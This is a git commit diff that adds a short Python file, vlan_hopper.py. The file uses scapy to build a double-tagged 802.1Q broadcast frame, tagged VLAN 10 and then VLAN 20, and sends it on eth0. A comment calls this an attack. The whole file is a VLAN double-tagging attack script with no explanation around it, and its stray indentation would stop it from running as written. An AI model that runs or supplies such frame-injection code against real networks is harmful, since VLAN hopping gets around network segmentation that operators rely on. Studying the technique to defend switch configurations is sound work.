d7a6a7e2f3961571c093ed013a544a9a3c85062e
Keirn H <78835210+Skelpo1@users.noreply.github.com>
2024-12-26 02:56:38 +0000

    Update vlan_hopper.py

--- .py/vlan_hopper.py
+++ .py/vlan_hopper.py
@@ -1,1 +1,5 @@
+from scapy.all import Ether, Dot1Q, sendp
 
+  eth_frame_ = Ether(dst="ff:ff:ff:ff:ff:ff") / Dot1Q(vlan=10) / Dot1Q(vlan=20) / "Test Payload"
+
+  sendp(eth_frame_, iface="eth0")# sendp is for deeper level of the internet level required for this attack type
